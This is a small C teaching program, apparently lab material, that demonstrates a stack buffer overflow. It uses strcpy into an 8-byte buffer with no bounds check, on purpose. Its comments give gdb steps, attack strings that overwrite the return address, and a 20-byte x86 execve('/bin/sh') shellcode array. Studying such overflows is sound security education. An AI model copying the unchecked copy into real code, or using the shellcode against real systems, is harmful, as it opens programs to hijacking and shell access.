#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
*
* Memory experiments
* 
*
* References:
* https://www.geeksforgeeks.org/c/memory-layout-of-c-program/
* https://users.cs.jmu.edu/bernstdh/web/common/lectures/summary_vulnerabilities_c_buffer-overflows.php
*
*
* Usage: make memory_checks && ./memory_checks 1234567
*
* make debug
* list show program code
* disas main show main function assembly code
* run 123456781234567812345678 - segfaults
* run 123456781234567811111111 - segfaults
* run 1234567812345678111111111 - overwrites return address
* run 1234567812345678111111118 - overwrites return address to 0x...38
* (0x38 is ASCII for character '8') Return address (rip) is being rewritten
* Check with info registers
* shellcode: 20 bytes
* unsigned char buf[] = 
"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f\x62"
"\x69\x6e\x89\xe3\xcd\x80"
*
*/

int main(int argc, char *argv[]) {
    char buf2[] = "testbuf";
    char buf[8];
    if (argc <= 1) {
        printf("Usage: %s <attack string>\n", argv[0]);
        exit(1);
    }
    strcpy(buf, argv[1]);
    printf("Arg String: %s\n", buf);
    printf("Buf2: %s\n", buf2);

    printf("buf address: %lu\n", (unsigned long)buf);
    printf("buf2 address: %lu\n", (unsigned long)buf2);

    return 0;
}
